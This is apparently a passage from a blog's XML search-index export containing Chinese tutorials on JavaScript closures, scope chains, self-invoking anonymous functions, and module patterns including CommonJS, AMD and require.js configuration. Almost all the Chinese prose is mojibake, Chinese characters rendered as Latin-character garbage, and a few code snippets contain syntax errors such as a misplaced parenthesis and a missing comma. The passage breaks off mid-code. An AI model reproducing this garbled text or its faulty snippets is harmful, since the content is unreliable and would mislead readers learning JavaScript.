å®žé™…ä¸Šï¼Œå˜é‡cæŒ‡å‘äº†å‡½æ•°bå½“å‡½æ•°açš„å†…éƒ¨å‡½æ•°è¢«å‡½æ•°aå¤–çš„ä¸€ä¸ªå˜é‡å¼•ç”¨æ—¶å€™ï¼Œå°±åˆ›å»ºäº†ä¸€ä¸ªé—­åŒ…é€å½»ç‚¹è¯´ï¼Œæ‰€è°“çš„â€œé—­åŒ…â€ï¼Œå°±æ˜¯åœ¨æž„é€ ä½“å†…å®šä¹‰å¦å¤–çš„å‡½æ•°ä½œä¸ºç›®æ ‡å¯¹è±¡çš„æ–¹æ³•å‡½æ•°ï¼Œè€Œè¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•å‡½æ•°åè¿‡æ¥å¼•ç”¨å¤–å±‚å‡½æ•°ä½“ä¸­çš„ä¸´æ—¶å˜é‡ï¼Œè¿™ä½¿å¾—åªè¦ç›®æ ‡å¯¹è±¡åœ¨ç”Ÿå­˜æœŸå†…å§‹ç»ˆèƒ½ä¿å­˜å…¶æ–¹æ³•ï¼Œå°±èƒ½é—´æŽ¥ä¿æŒåŽŸæž„é€ å‡½æ•°ä½“å½“æ—¶ç”¨åˆ°çš„ä¸´æ—¶å˜é‡å€¼ã€‚å°½ç®¡æœ€å¼€å§‹çš„æž„é€ å‡½æ•°è°ƒç”¨ä»¥åŠç»“æŸï¼Œä¸´æ—¶å˜é‡çš„åç§°ä¹Ÿéƒ½æ¶ˆå¤±äº†ï¼Œä½†åœ¨ç›®æ ‡å¯¹è±¡çš„æ–¹æ³•å†…å´å§‹ç»ˆèƒ½å¼•ç”¨åˆ°è¯¥å˜é‡çš„å€¼è€Œä¸”è¯¥å€¼åªèƒ½é€šè¿‡è¿™ç§æ–¹æ³•æ¥è®¿é—®ï¼Œå³ä½¿å†æ¬¡è°ƒç”¨ç›¸åŒçš„æž„é€ å‡½æ•°ï¼Œä½†åªä¼šç”Ÿæˆæ–°å¯¹è±¡å’Œæ–¹æ³•ï¼Œæ–°çš„ä¸´æ—¶å˜é‡åªæ˜¯å¯¹åº”æ–°çš„å€¼ï¼Œå’Œä¸Šæ¬¡çš„è°ƒç”¨éƒ½æ˜¯å„è‡ªç‹¬ç«‹çš„ã€‚ é—­åŒ…å†…çš„å¾®è§‚ä¸–ç•Œå‡½æ•°çš„æ‰§è¡ŒçŽ¯å¢ƒï¼ˆexcution contextï¼‰\æ´»åŠ¨å¯¹è±¡ï¼ˆcall objectï¼‰\ä½œç”¨åŸŸï¼ˆscopeï¼‰\ä½œç”¨åŸŸé“¾ï¼ˆscope chainï¼‰Â· å½“å®šä¹‰å‡½æ•°açš„æ—¶å€™ï¼Œjsè§£é‡Šå™¨ä¼šå°†å‡½æ•°açš„ä½œç”¨åŸŸé“¾ï¼ˆscope chainï¼‰è®¾ç½®ä¸ºå®šä¹‰aæ—¶aæ‰€åœ¨çš„çŽ¯å¢ƒï¼Œå¦‚æžœaæ˜¯ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œåˆ™scope chain ä¸­åªæœ‰windowå¯¹è±¡Â· å½“æ‰§è¡Œå‡½æ•°açš„æ—¶å€™ï¼Œaä¼šè¿›å…¥ç›¸åº”çš„æ‰§è¡ŒçŽ¯å¢ƒï¼ˆexcution contextï¼‰Â· åœ¨åˆ›å»ºæ‰§è¡ŒçŽ¯å¢ƒçš„è¿‡ç¨‹ä¸­ï¼Œé¦–å…ˆä¼šä¸ºaæ·»åŠ ä¸€ä¸ªscopeå±žæ€§ï¼Œå³açš„ä½œç”¨åŸŸï¼Œå…¶å€¼å°±æ˜¯ä¸ºç¬¬ä¸€æ­¥ä¸­çš„scope chain,å³a.scope = açš„ä½œç”¨åŸŸé“¾Â· ç„¶åŽæ‰§è¡ŒçŽ¯å¢ƒä¼šåˆ›å»ºä¸€ä¸ªæ´»åŠ¨å¯¹è±¡ï¼ˆcall objectï¼‰ã€‚æ´»åŠ¨å¯¹è±¡ä¹Ÿæ˜¯ä¸€ä¸ªæ‹¥æœ‰å±žæ€§çš„å¯¹è±¡ï¼Œä½†å®ƒä¸å…·æœ‰åŽŸåž‹è€Œä¸”ä¸èƒ½é€šè¿‡javaScriptä»£ç ç›´æŽ¥è®¿é—®ï¼Œåˆ›å»ºå®Œæ´»åŠ¨å¯¹è±¡ï¼ŒæŠŠæ´»åŠ¨å¯¹è±¡æ·»åŠ åˆ°açš„ä½œç”¨åŸŸé“¾çš„æœ€é¡¶ç«¯ï¼Œæ­¤æ—¶açš„ä½œç”¨åŸŸè„¸åŒ…å«äº†ä¸¤ä¸ªå¯¹è±¡ï¼šaçš„æ´»åŠ¨å¯¹è±¡å’Œwindowå¯¹è±¡Â· ä¸‹ä¸€æ­¥å°±æ˜¯åœ¨æ´»åŠ¨å¯¹è±¡ä¸Šæ·»åŠ ä¸€ä¸ªargumentså±žæ€§ï¼Œå®ƒä¿å­˜ç€è°ƒç”¨å‡½æ•°æ—¶aæ‰€ä¼ é€’çš„å‡½æ•°Â· æœ€åŽå°±æŠŠæ‰€æœ‰å‡½æ•°açš„å½¢å‚å’Œå†…éƒ¨çš„å‡½æ•°bçš„å¼•ç”¨ä¹Ÿæ·»åŠ åˆ°açš„æ´»åŠ¨å¯¹è±¡ä¸Šï¼Œåœ¨è¿™ä¸€æ­¥ä¸­ï¼Œå®Œæˆäº†å‡½æ•°bçš„å®šä¹‰ï¼Œå‡½æ•°bçš„ä½œç”¨åŸŸé“¾è¢«è®¾ç½®ä¸ºbæ‰€å®šä¹‰çš„çŽ¯å¢ƒï¼Œå°±æ˜¯açš„ä½œç”¨åŸŸ åˆ°æ­¤ï¼Œæ•´ä¸ªå‡½æ•°aä»Žå®šä¹‰åˆ°æ‰§è¡Œçš„æ­¥éª¤å°±å®Œæˆäº†ã€‚æ­¤æ—¶aè¿”å›žå‡½æ•°bçš„å¼•ç”¨ç»™cï¼Œåˆå‡½æ•°bçš„ä½œç”¨åŸŸé“¾åŒ…å«äº†å¯¹å‡½æ•°açš„æ´»åŠ¨å¯¹è±¡çš„å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´bå¯ä»¥è®¿é—®åˆ°aä¸­å®šä¹‰çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°ã€‚å‡½æ•°bè¢«cå¼•ç”¨ï¼Œå‡½æ•°båˆä¾èµ–å‡½æ•°aï¼Œå› æ­¤å‡½æ•°aåœ¨è¿”å›žåŽä¸ä¼šè¢«GCå›žæ”¶ã€‚å½“å‡½æ•°bæ‰§è¡Œçš„æ—¶å€™äº¦ä¼šåƒä»¥ä¸Šæ­¥éª¤ä¸€æ ·ã€‚å› æ­¤ï¼Œæ‰§è¡Œæ—¶bçš„ä½œç”¨åŸŸé“¾åŒ…å«äº†3ä¸ªå¯¹è±¡ï¼šbçš„æ´»åŠ¨å¯¹è±¡ã€açš„æ´»åŠ¨å¯¹è±¡å’Œwindowå¯¹è±¡ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šå¦‚å›¾æ‰€ç¤ºï¼Œå½“åœ¨å‡½æ•°bä¸­è®¿é—®ä¸€ä¸ªå˜é‡çš„æ—¶å€™ï¼Œæœç´¢é¡ºåºæ˜¯ï¼šÂ· å…ˆæœç´¢è‡ªèº«çš„æ´»åŠ¨å¯¹è±¡ï¼Œå¦‚æžœå­˜åœ¨åˆ™è¿”å›žï¼Œå¦‚æžœä¸å­˜åœ¨å°†ç»§ç»­æœç´¢å‡½æ•°açš„æ´»åŠ¨å¯¹è±¡ï¼Œä¾æ¬¡æŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°ä¸ºæ­¢ã€‚Â· å¦‚æžœå‡½æ•°bå­˜åœ¨prototypeåŽŸåž‹å¯¹è±¡ï¼Œåˆ™åœ¨æŸ¥æ‰¾å®Œè‡ªèº«çš„æ´»åŠ¨å¯¹è±¡åŽå…ˆæŸ¥æ‰¾è‡ªèº«çš„åŽŸåž‹å¯¹è±¡ï¼Œå†ç»§ç»­æŸ¥æ‰¾ã€‚è¿™å°±æ˜¯Javascriptä¸­çš„å˜é‡æŸ¥æ‰¾æœºåˆ¶ã€‚Â· å¦‚æžœæ•´ä¸ªä½œç”¨åŸŸé“¾ä¸Šéƒ½æ— æ³•æ‰¾åˆ°ï¼Œåˆ™è¿”å›žundefinedã€‚]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascriptåŒ¿åå‡½æ•°]]></title>
    <url>%2F2018-03-21-javascript-anonymousFunctions.html</url>
    <content type="text"><![CDATA[JavaScriptåŒ¿åå‡½æ•° åŒ¿åå‡½æ•°åŒ¿åå‡½æ•°ï¼š 123(function(window,undefied)&#123; //jQuery code&#125;)(window); è¿™ä¸ªä¸€ä¸ªè‡ªè°ƒç”¨åŒ¿åå‡½æ•°ã€‚ç¬¬ä¸€ä¸ªæ‹¬å·åˆ›å»ºäº†ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œç¬¬äºŒä¸ªæ‹¬å·ç«‹å³æ‰§è¡Œ é€šè¿‡å®šä¹‰ä¸€ä¸ªè¿™æ ·çš„åŒ¿åå‡½æ•°ï¼Œåˆ›å»ºäº†ä¸€ä¸ªâ€œç§æœ‰â€çš„å‘½åç©ºé—´ï¼Œè¯¥å‘½åç©ºé—´çš„å˜é‡å’Œæ–¹æ³•ï¼Œä¸ä¼šç ´åå…¨å±€çš„å‘½åç©ºé—´ã€‚è¿™ç‚¹éžå¸¸æœ‰ç”¨ä¹Ÿæ˜¯ä¸€ä¸ªJsæ¡†æž¶å¿…é¡»æ”¯æŒçš„åŠŸèƒ½ã€‚jQueryè¢«åº”ç”¨åœ¨æˆåƒä¸Šä¸‡çš„jsç¨‹åºä¸­ï¼Œå¿…é¡»ä¿è¯jQueryåˆ›å»ºçš„å˜é‡ä¸èƒ½ä¸Žå¯¼å…¥ä»–çš„ç¨‹åºæ‰€ä½¿ç”¨çš„å˜é‡æœ‰æ‰€å†²çªã€‚ åŒ¿åå‡½æ•°ä»Žè¯­æ³•ä¸Šå«å‡½æ•°ç›´æŽ¥é‡ï¼Œjsè¯­æ³•éœ€è¦åŒ…å›´åŒ¿åå‡½æ•°çš„æ‹¬å·ï¼Œäº‹å®žä¸Šè°ƒç”¨åŒ¿åå‡½æ•°çš„æœ‰ä¸¤ç§å†™æ³•ï¼š 123456789(function()&#123; console.info(this); console.info(arguments);&#125;(window);) (function()&#123; console.info(this); console.info(arguments); &#125;)(window);]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascriptæ¨¡å—åŒ–]]></title>
    <url>%2F2018-03-21-javascript-module.html</url>
    <content type="text"><![CDATA[JavaScriptæ¨¡å—åŒ–æ€æƒ³ æ¨¡å—åŒ–æ¨¡å—åŒ–çš„åŸºæœ¬æ€æƒ³ï¼ˆ1ï¼‰åŽŸå§‹å†™æ³•ï¼šæ¨¡å—å°±æ˜¯å®žçŽ°ç‰¹åœ°åŠŸèƒ½çš„ä¸€ç»„æ–¹æ³•ï¼ˆå°†ä¸åŒå‡½æ•°ç®€å•åœ°æ”¾åœ¨ä¸€èµ·ï¼Œå°±æ˜¯ä¸€ä¸ªæ¨¡å—ï¼‰ 123456function m1()&#123;//...&#125;function m2()&#123;//...&#125; ç¼ºç‚¹ï¼šæ±¡æŸ“äº†å…¨å±€å˜é‡ï¼Œæ— æ³•ä¿è¯ä¸ä¸Žå…¶ä»–æ¨¡å—å‘é€å˜é‡åçš„å†²çªï¼Œè€Œä¸”æ¨¡å—æˆå‘˜é—´çœ‹ä¸å‡ºæ¥ç›´æŽ¥å…³ç³»ï¼ˆ2ï¼‰å¯¹è±¡å†™æ³•ï¼šå°†æ¨¡å—å†™æˆä¸€ä¸ªå¯¹è±¡ï¼Œå°†æ‰€æœ‰æ¨¡å—æˆå‘˜éƒ½æ”¾åœ¨å¯¹è±¡é‡Œé¢ 123456789var module = new Object(&#123;_count : 0, m1 : function()&#123; //... &#125; m2 : function()&#123; //... &#125;&#125;); ä¼˜ç‚¹ï¼šå‡½æ•°m1()ä¸Žå‡½æ•°m2()éƒ½å°è£…åœ¨moduleå¯¹è±¡ä¸­ï¼Œä½¿ç”¨çš„æ—¶å€™å°±æ˜¯è°ƒç”¨å¯¹è±¡ä¸­çš„å±žæ€§module.m1(); module._count = 5;ï¼ˆ3ï¼‰ç«‹å³æ‰§è¡Œå‡½æ•°å†™æ³•IIFE å¯ä»¥è¾¾åˆ°ä¸æš´éœ²ç§æœ‰æˆå‘˜çš„ç›®çš„ 12345678910111213var module = (function()&#123; var _count = 0; var m1 = function()&#123; //... &#125;; var m2 = function()&#123; //... &#125;; return &#123; m1 : m1, m2 : m2, &#125;&#125;)(); ä¼˜ç‚¹ï¼šå¤–éƒ¨ä»£ç æ— æ³•è¯»å–å†…éƒ¨_countå˜é‡ console.log(module._count); //undefinedï¼ˆ4ï¼‰æ”¾å¤§æ¨¡å¼å¦‚æžœæ¨¡å—å¾ˆå¤§ï¼Œå¿…é¡»åˆ†æˆå‡ ä¸ªéƒ¨åˆ†ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªæ¨¡å—éœ€è¦ç»§æ‰¿å¦å¤–ä¸€ä¸ªæ¨¡å—ï¼Œå°±æœ‰å¿…è¦ä½¿ç”¨æ”¾å¤§æ¨¡å¼ï¼ˆaugmentationï¼‰ 123456var module = (function (mod)&#123; mod.m3 = function()&#123; //... &#125;; return mod;&#125;)(module); ä¸Šé¢çš„ä»£ç ä¸ºmoduleæ¨¡å—æ·»åŠ äº†ä¸€ä¸ªæ–°çš„æ–¹æ³•m3ï¼Œç„¶åŽè¿”å›žæ–°çš„moduleæ¨¡å—ã€‚ï¼ˆ5ï¼‰å®½æ”¾å¤§æ¨¡å¼ï¼ˆLoose augmentationï¼‰åœ¨æµè§ˆå™¨çŽ¯å¢ƒä¸­ï¼Œæ¨¡å—çš„å„ä¸ªéƒ¨åˆ†é€šå¸¸éƒ½æ˜¯ä»Žç½‘ä¸ŠèŽ·å–çš„ï¼Œæœ‰æ—¶å€™æ— æ³•çŸ¥é“å“ªä¸ªéƒ¨åˆ†ä¼šå…ˆåŠ è½½ã€‚é‡‡å–4çš„å†™æ³•ï¼Œç¬¬ä¸€ä¸ªæ‰§è¡Œéƒ¨åˆ†æœ‰å¯èƒ½åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨ç©ºå¯¹è±¡ 1234var module = (function (mod)&#123; //... return mod;&#125;)(window.module || &#123;&#125;); ï¼ˆ6ï¼‰è¾“å…¥å…¨å±€å˜é‡ç‹¬ç«‹æ€§æ˜¯æ¨¡å—çš„é‡è¦ç‰¹ç‚¹ï¼Œæ¨¡å—å†…éƒ¨æœ€å¥½ä¸è¦ä¸Žç¨‹åºçš„å…¶ä»–éƒ¨åˆ†äº¤äº’ï¼Œä¸ºäº†åœ¨æ¨¡å—å†…éƒ¨è°ƒç”¨å…¨å±€å˜é‡ï¼Œå¿…é¡»æ˜¾å¼åœ°å°†å…¶ä»–å˜é‡è¾“å…¥æ¨¡å— 123var module = (function($,YAHOO)&#123; //...&#125;)(jQuery, YAHOO); ä¸Šé¢çš„æ¨¡å—éœ€è¦ä½¿ç”¨jQueryå’ŒYUIåº“ï¼Œå°±è¦æŠŠè¿™ä¸¤ä¸ªåº“ï¼ˆæ¨¡å—ï¼‰ï¼Œå½“ä½œæ˜¯å‚æ•°è¾“å…¥moduleä¸­ï¼Œè¿™æ ·åšé™¤äº†ä¿è¯äº†æ¨¡å—çš„ç‹¬ç«‹æ€§ï¼Œè¿˜ä½¿å¾—æ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»å˜å¾—æ˜Žæ˜¾ã€‚ AMDè§„èŒƒé€šè¡Œçš„javascriptæ¨¡å—è§„èŒƒå…±æœ‰ä¸¤ç§ï¼šCommonJså’ŒAMDï¼ˆ1ï¼‰CommonJSå½“node.jsé¡¹ç›®è¯žç”ŸåŽï¼Œå°†JavaScriptè¯­è¨€ç”¨äºŽæœåŠ¡å™¨ç«¯ç¼–ç¨‹ï¼Œnode.jsçš„æ¨¡å—ç³»ç»Ÿï¼Œå°±æ˜¯å‚ç…§CommonJSè§„èŒƒå®žçŽ°çš„ã€‚åœ¨CommonJSä¸­æœ‰ä¸€ä¸ªå…¨å±€æ€§æ–¹æ³•require(),ç”¨äºŽåŠ è½½æ¨¡å—ã€‚å‡è®¾æœ‰ä¸ªæ•°å­¦æ¨¡å—math.jsã€‚å°±å¯ä»¥åƒä¸‹é¢é‚£æ ·åŠ è½½ 1234var math = require("math");//è°ƒç”¨æ¨¡å—æä¾›çš„æ–¹æ³•math.add(2,3); é™åˆ¶ï¼šCommonJSè§„èŒƒä¸é€‚ç”¨æµè§ˆå™¨çŽ¯å¢ƒï¼Œç›¸åŒçš„ä»£ç ï¼Œåœ¨æµè§ˆå™¨ä¸­è¿è¡Œï¼Œå¿…é¡»ç­‰åˆ°math.jsåŠ è½½å®Œæˆï¼Œå¦‚æžœåŠ è½½çš„æ—¶å€™å¾ˆé•¿ï¼Œé‚£ä¹ˆæ•´ä¸ªåº”ç”¨å°±ä¼šåœåœ¨é‚£é‡Œç­‰ã€‚è¿™å¯¹æœåŠ¡ç«¯ä¸æ˜¯é—®é¢˜ï¼Œå› ä¸ºæ‰€æœ‰çš„æ¨¡å—éƒ½æ˜¯å­˜æ”¾åœ¨æœ¬åœ°ç¡¬ç›˜æˆ–åœ¨é‚£ä¸ªï¼Œå¯ä»¥åŒæ­¥åŠ è½½å®Œæˆï¼Œç­‰å¾…çš„æ—¶é—´å°±æ˜¯ç¡¬ç›˜çš„è¯»å–æ—¶é—´ã€‚è€Œåœ¨æµè§ˆå™¨ï¼Œå› ä¸ºæ¨¡å—éƒ½å­˜æ”¾åœ¨æœåŠ¡ç«¯ï¼Œç­‰å¾…æ—¶é—´å–å†³äºŽç½‘é€Ÿçš„å¿«æ…¢ï¼Œå¯èƒ½è¦ç­‰å¾ˆä¹…çš„æ—¶é—´ï¼Œæµè§ˆå™¨å¤„äºŽå‡æ­»çš„çŠ¶æ€ã€‚å› æ­¤æµè§ˆå™¨ç«¯çš„æ¨¡å—ä¸å¯ä»¥é‡‡ç”¨åŒæ­¥åŠ è½½ï¼ˆsynchronousï¼‰,åªèƒ½é‡‡ç”¨å¼‚æ­¥åŠ è½½ï¼ˆasynchronousï¼‰è¿™å°±æ˜¯AMDè¯žç”Ÿçš„èƒŒæ™¯ã€‚ï¼ˆ2ï¼‰AMDå…¨ç¨‹â€œAsynchronous Module Definitionâ€æ„æ€æ˜¯å¼‚æ­¥æ¨¡å—å®šä¹‰ã€‚å®ƒé‡‡ç”¨å¼‚æ­¥æ–¹å¼åŠ è½½æ¨¡å—ï¼Œæ¨¡å—çš„åŠ è½½ä¸å½±å“åŽé¢è¯­å¥çš„è¿è¡Œã€‚æ‰€æœ‰ä¸€æ è¿™ä¸ªæ¨¡å—çš„è¯­å¥ï¼Œéƒ½å®šä¹‰åœ¨ä¸€ä¸ªå›žè°ƒå‡½æ•°ä¸­ã€‚ç­‰åˆ°åŠ è½½å®ŒæˆåŽï¼Œè¿™ä¸ªå›žè°ƒå‡½æ•°æ‰ä¼šæ‰§è¡Œã€‚AMDä¹Ÿé‡‡ç”¨require()è¯­å¥åŠ è½½æ¨¡å—ï¼Œä¸åŒäºŽCommonJSçš„æ˜¯å®ƒè¦æ±‚ä¸¤ä¸ªå‚æ•°ã€‚ 1require([module],callback); ç¬¬ä¸€ä¸ªå‚æ•°[module]æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‡Œé¢çš„æˆå‘˜å°±æ˜¯è¦åŠ è½½çš„æ¨¡å—ï¼›ç¬¬äºŒä¸ªå‚æ•°callbackåˆ™æ˜¯åŠ è½½å®Œæˆä¹‹åŽçš„å›žè°ƒå‡½æ•°ã€‚è¿˜æ˜¯ä½¿ç”¨CommonJSçš„ä»£ç ï¼Œå¦‚ä¸‹ 123require([â€˜mathâ€™]ï¼Œfunction(math)&#123; math.add(2,3);&#125;); math.add()ä¸Žmathæ¨¡å—åŠ è½½ä¸æ˜¯åŒæ­¥çš„ï¼Œæ‰€ä»¥æµè§ˆå™¨ä¸ä¼šå‡ºçŽ°å‡æ­»çš„çŠ¶æ€ã€‚AMDæ¯”CommonJSæ›´é€‚åˆæµè§ˆå™¨çŽ¯å¢ƒ require.jsçš„ä½¿ç”¨ï¼ˆ1ï¼‰åŽŸå§‹åŠ è½½jsæ–¹æ³•åŠ è½½å¤šä¸ªjsæ–‡ä»¶ï¼ŒåŠ è½½çš„æ—¶å€™æµè§ˆå™¨ä¼šåœæ­¢ç½‘é¡µæ¸²æŸ“ï¼ŒåŠ è½½çš„æ–‡ä»¶è¶Šå¤šï¼Œé¡µé¢å¤±åŽ»å“åº”çš„æ—¶é—´å°±ä¼šè¶Šé•¿ã€‚å…¶æ¬¡ç”±äºŽjsæ–‡ä»¶ä¹‹é—´å­˜åœ¨ä¾èµ–å…³ç³»ã€‚å› æ­¤å¿…é¡»ä¸¥æ ¼ä¿è¯åŠ è½½é¡ºåºï¼Œä¾èµ–æ€§æœ€å¤§çš„æ¨¡å—ä¸€å®šè¦æ”¾åœ¨æœ€åŽåŠ è½½ï¼Œå½“ä¾èµ–å…³ç³»å¾ˆå¤æ‚çš„æ—¶å€™ï¼Œä»£ç çš„ç¼–å†™å’Œç»´æŠ¤éƒ½ä¼šå˜å¾—å›°éš¾ã€‚ï¼ˆ2ï¼‰require.jsçš„åŠ è½½ä¼˜ç‚¹ï¼šå®žçŽ°äº†jsæ–‡ä»¶çš„å¼‚æ­¥åŠ è½½ï¼Œé¿å…äº†ç½‘é¡µå¤±åŽ»å“åº”ï¼Œç®¡ç†æ¨¡å—ä¹‹é—´çš„ä¾èµ–æ€§ï¼Œä¾¿äºŽä»£ç çš„ç¼–å†™å’Œç»´æŠ¤ã€‚ä½¿ç”¨æ­¥éª¤ï¼š1.ä¸‹è½½require.js2.åŠ è½½è¿™ä¸ªrequire.jsï¼Œä¹Ÿå¯èƒ½é€ æˆç½‘é¡µå¤±åŽ»å“åº”ã€‚è§£å†³åŠžæ³•æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯æŠŠå®ƒæ”¾åœ¨ç½‘é¡µåº•éƒ¨åŠ è½½ï¼Œå¦ä¸€ä¸ªæ˜¯ &lt;script src=&quot;js/require.js&quot; defer aysnc = &#39;true&#39;&gt;&lt;/script&gt;asyncå±žæ€§è¡¨æ˜Žè¿™ä¸ªæ–‡ä»¶éœ€è¦å¼‚æ­¥åŠ è½½ï¼Œé¿å…ç½‘é¡µå¤±åŽ»å“åº”ã€‚IEä¸æ”¯æŒè¿™ä¸ªå±žæ€§ï¼Œåªæ”¯æŒdefer3.åŠ è½½å®Œrequire.js åŽå°±è¦åŠ è½½æˆ‘ä»¬è‡ªå·±çš„ä»£ç ï¼Œå‡å®šæˆ‘ä»¬çš„ä»£ç æ–‡ä»¶æ˜¯main.js,ä¹Ÿæ”¾åœ¨jsç›®å½•ä¸‹ã€‚&lt;script src =&quot;js/require.js&quot; data-main=&quot;js/main&quot;&gt;&lt;/script&gt;data-mainå±žæ€§çš„ä½œç”¨æ˜¯ï¼ŒæŒ‡å®šç½‘é¡µç¨‹åºçš„ä¸»è¦æ¨¡å—ã€‚ï¼ˆ3ï¼‰ä¸»æ¨¡å—çš„å†™æ³•ä¸»æ¨¡å—è¦ä¾èµ–å…¶ä»–æ¨¡å—ï¼Œä½¿ç”¨AMDè§„èŒƒå®šä¹‰çš„require()å‡½æ•°ã€‚ 1234//main.jsrequire(['moduleA','moduleB','moduleC'],function(moduleA, moduleB, moduleC)&#123; //...&#125;); require()å‡½æ•°æŽ¥å—ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ•°ç»„ï¼Œè¡¨ç¤ºæ‰€ä¾èµ–çš„æ¨¡å—ã€‚ä¸Šä¾‹å°±æ˜¯[â€˜moduleAâ€™, â€˜moduleBâ€™, â€˜moduleCâ€™] ï¼Œå³ä¸»æ¨¡å—ä¾èµ–è¿™ä¸‰ä¸ªæ¨¡å—ã€‚ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯ä¸€ä¸ªå›žè°ƒå‡½æ•°ï¼Œå½“å‰é¢æŒ‡å®šçš„æ¨¡å—éƒ½åŠ è½½å®Œæˆä¹‹åŽï¼Œå®ƒå°†è¢«è°ƒç”¨ï¼ŒåŠ è½½çš„æ¨¡å—ä¼šä»¥å‚æ•°å½¢å¼ä¼ å…¥è¯¥å‡½æ•°ï¼Œä»Žè€Œåœ¨å›žè°ƒå‡½æ•°çš„å†…éƒ¨å°±å¯ä»¥ä½¿ç”¨è¿™äº›æ¨¡å—äº†ã€‚require()å¼‚æ­¥åŠ è½½moduleA,moduleB,moduleC,æµè§ˆå™¨å°±ä¸ä¼šå¤±åŽ»å“åº”ï¼Œå®ƒæŒ‡å®šçš„å›žè°ƒå‡½æ•°ï¼Œåªæœ‰å‰é¢çš„æ¨¡å—éƒ½åŠ è½½æˆåŠŸåŽï¼Œæ‰ä¼šè¿è¡Œï¼Œè§£å†³äº†ä¾èµ–æ€§çš„é—®é¢˜ã€‚å®žé™…ä¾‹å­ï¼š 123require(['jquery','underscore','backbone'],function($,_,Backbone)&#123; //...&#125;); require.jsä¼šåŠ è½½jQueryï¼Œunderscore,backbone ç„¶åŽå†è¿è¡Œå›žè°ƒå‡½æ•°ï¼Œä¸»è¦æ¨¡å—çš„ä»£ç å°±å†™åœ¨å›žè°ƒå‡½æ•°ä¸­ï¼ˆ4ï¼‰æ¨¡å—çš„åŠ è½½require.config()ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•ï¼Œå¯¹æ¨¡å—çš„åŠ è½½è¡Œä¸ºè®°æ€§è‡ªå®šä¹‰ã€‚require.config()å°±å†™åœ¨ä¸»æ¨¡å—main.jsçš„å¤´éƒ¨ã€‚å‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡çš„pathså±žæ€§æŒ‡å®šå„ä¸ªæ¨¡å—çš„åŠ è½½è·¯å¾„ã€‚é»˜è®¤æ˜¯åœ¨åŒä¸€ä¸ªç›®å½•ï¼ˆjså­ç›®å½•ï¼‰ 1234567require.config(&#123; paths: &#123; "jquery": "jquery.min", "underscore": "underscore.min", "backbone": "backbone.min", &#125;&#125;); ä¸åœ¨é€šè¿‡ç›®å½•ï¼Œä¾‹å¦‚åœ¨js/libï¼Œæœ‰ä¸¤ç§å†™æ³•ï¼š1.é€ä¸€æŒ‡å®šè·¯å¾„ 1234567require.config(&#123; paths: &#123; "jquery": "lib/jquery.min", "underscore": "lib/underscore.min", "backbone": "lib/backbone.min", &#125;&#125;); 2.æ”¹å˜åŸºç›®å½• 12345678require.config(&#123; baseUrl: "js/lib", paths: &#123; "jquery": "jquery.min", "underscore": "underscore.min", "backbone": "backbone.min", &#125;&#125;); å¦‚æžœæ˜¯åœ¨å¦ä¸€ä¸ªä¸»æœºä¸Šï¼Œä¹Ÿå¯ä»¥æŒ‡å®šå®ƒçš„åœ°å€ 123456require.config(&#123; paths: &#123; "jquery": "https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min" &#125;&#125;); require.jsè¦æ±‚æ¯ä¸ªæ¨¡å—éƒ½æ˜¯å•ä¸€ä¸ªjsæ–‡ä»¶ï¼Œè¿™æ ·çš„è¯ï¼ŒåŠ è½½å¤šä¸ªæ¨¡å—ï¼Œå°±ä¼šå‘é€å¤šæ¬¡httpè¯·æ±‚ï¼Œä¹Ÿä¼šå½±å“åˆ°ç½‘é¡µçš„åŠ è½½é€Ÿåº¦ã€‚å› è€Œå®ƒæä¾›äº†ä¸€ä¸ªä¼˜åŒ–å·¥å…·ï¼Œå½“æ¨¡å—éƒ¨ç½²å®Œæ¯•åŽï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªå·¥å…·å°†å¤šä¸ªæ¨¡å—åˆå¹¶åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå‡å°‘httpè¯·æ±‚æ•°ã€‚ï¼ˆ5ï¼‰AMDå†™æ³•require.jsåŠ è½½çš„æ¨¡å—ï¼Œé‡‡ç”¨AMDè§„èŒƒï¼Œé‚£å°±æ˜¯è¯´æ¨¡æ¿ä¹Ÿåº”è¯¥æŒ‰ç…§AMDçš„è§„èŒƒæ¥å†™ã€‚å…·ä½“çš„è¯´ï¼Œå°±æ˜¯æ¨¡å—å¿…é¡»é‡‡ç”¨ç‰¹å®šçš„define()å‡½æ•°æ¥å®šä¹‰ã€‚å¦‚æžœä¸€ä¸ªæ¨¡å—ä¸ä¾èµ–å…¶ä»–æ¨¡å—ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æŽ¥å®šä¹‰åœ¨difineï¼ˆï¼‰å‡½æ•°ä¹‹ä¸­ã€‚å‡å®šçŽ°åœ¨æœ‰ä¸ªmath.jsæ–‡ä»¶ï¼Œå®ƒå®šäº†ä¸€ä¸ªmathæ¨¡å—ï¼Œé‚£ä¹ˆmath.jså°±è¦è¿™æ ·å†™ï¼š 123456789//math.jsdefine(function()&#123; var add = function(x,y)&#123; return x+y; &#125;; return &#123; add : add &#125;;&#125;); åŠ è½½æ–¹æ³•å¦‚ä¸‹ï¼š 12345678910111213//main.jsrequire(['math'],function(math)&#123; 